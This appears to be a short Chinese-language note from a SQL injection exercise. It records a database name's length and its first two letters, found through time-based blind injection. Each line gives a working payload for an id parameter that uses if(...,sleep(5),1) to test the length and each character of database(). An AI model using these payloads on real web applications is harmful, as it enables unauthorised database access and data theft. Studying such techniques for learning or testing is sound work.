数据库长度: 15&id=88 and if(length(database())=15,sleep(5),1)#
数据库名: dt&id=88 and if(ascii(substr(database(),1,1))=116,sleep(5),1)--+&id=88 and if(ascii(substr(database(),2,1))=100,sleep(5),1)--+
